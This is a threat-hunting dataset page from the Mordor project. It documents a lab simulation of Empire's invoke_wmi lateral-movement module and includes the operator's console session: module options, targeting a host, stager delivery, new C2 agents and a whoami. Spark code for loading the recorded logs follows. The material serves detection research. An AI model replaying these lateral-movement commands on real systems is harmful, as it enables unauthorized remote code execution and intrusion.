# Empire Invoke WMI

## Metadata


|                   |    |
|:------------------|:---|
| id                | SDWIN-190518214442 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/05/18 |
| platform          | Windows |
| Mordor Environment| Mordor shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/lateral_movement/invoke_wmi.py |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_invoke_wmi.tar.gz |

## Dataset Description
This dataset represents adversaries using WMI to execute malicious code on endpoints remotely

## Adversary View
```
(Empire: V6W3TH8Y) > usemodule lateral_movement/invoke_wmi
(Empire: powershell/lateral_movement/invoke_wmi) > info

              Name: Invoke-WMI
            Module: powershell/lateral_movement/invoke_wmi
        NeedsAdmin: False
        OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @harmj0y

Description:
  Executes a stager on remote hosts using WMI.

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  Listener     True                                  Listener to use.                        
  CredID       False                                 CredID from the store to use.           
  ComputerName True                                  Host[s] to execute the stager on, comma 
                                                    separated.                              
  Proxy        False       default                   Proxy to use for request (default, none,
                                                    or other).                              
  UserName     False                                 [domain\]username to use to execute     
                                                    command.                                
  ProxyCreds   False       default                   Proxy credentials                       
                                                    ([domain\]username:password) to use for 
                                                    request (default, none, or other).      
  UserAgent    False       default                   User-agent string to use for the staging
                                                    request (default, none, or other).      
  Password     False                                 Password to use to execute command.     
  Agent        True        V6W3TH8Y                  Agent to run module on.                 

(Empire: powershell/lateral_movement/invoke_wmi) > set Listener https
(Empire: powershell/lateral_movement/invoke_wmi) > set ComputerName IT001.shire.com
(Empire: powershell/lateral_movement/invoke_wmi) > execute
[*] Tasked V6W3TH8Y to run TASK_CMD_WAIT
[*] Agent V6W3TH8Y tasked with task ID 6
[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_wmi
(Empire: powershell/lateral_movement/invoke_wmi) > Invoke-Wmi executed on "IT001.shire.com"
[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
[*] New agent ZLPB8CV3 checked in
[+] Initial agent ZLPB8CV3 from 10.0.10.103 now active (Slack)
[*] Sending agent (stage 2) to ZLPB8CV3 at 10.0.10.103

(Empire: powershell/lateral_movement/invoke_wmi) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 21:45:47  https           
TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 21:45:44  https           
EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 21:45:43  https           

V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\pgustavo          powershell         5204   5/0.0    2019-05-18 21:45:43  https           
38APWSR1 ps 172.18.39.105   IT001             *SHIRE\pgustavo         MSBuild            5656   5/0.0    2019-05-18 21:45:46  https           
ZLPB8CV3 ps 172.18.39.105   IT001             *SHIRE\pgustavo         powershell         5804   5/0.0    2019-05-18 21:45:44  https           


(Empire: agents) > interact ZLPB8CV3
(Empire: ZLPB8CV3) > shell whoami
[*] Tasked ZLPB8CV3 to run TASK_SHELL
[*] Agent ZLPB8CV3 tasked with task ID 1
(Empire: ZLPB8CV3) > shire\pgustavo
..Command execution completed.

(Empire: ZLPB8CV3) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_invoke_wmi.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        